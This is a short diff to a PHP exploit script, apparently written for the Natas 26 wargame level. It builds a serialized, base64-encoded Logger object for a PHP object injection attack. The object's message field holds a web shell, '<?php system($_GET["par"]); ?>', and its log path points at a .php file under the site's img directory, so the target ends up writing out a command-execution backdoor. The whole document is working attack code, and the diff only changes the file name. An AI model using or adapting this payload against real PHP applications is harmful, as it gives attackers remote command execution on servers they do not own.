@@ -1,7 +1,7 @@
 <?php
 
 class Logger{
-    private $logFile = "/var/www/natas/natas26/img/qwert.php";
+    private $logFile = "/var/www/natas/natas26/img/mimimi.php";
     private $initMsg = "tebelash\n";
     private $exitMsg = '<?php system($_GET["par"]); ?>\n';     
     // function __construct(){
@@ -14,7 +14,7 @@ class Logger{
 
 
 
-$obj = new Logger;
+$obj = new Logger();
 
 // echo htmlspecialchars(serialize($obj));
 print base64_encode(serialize($obj));
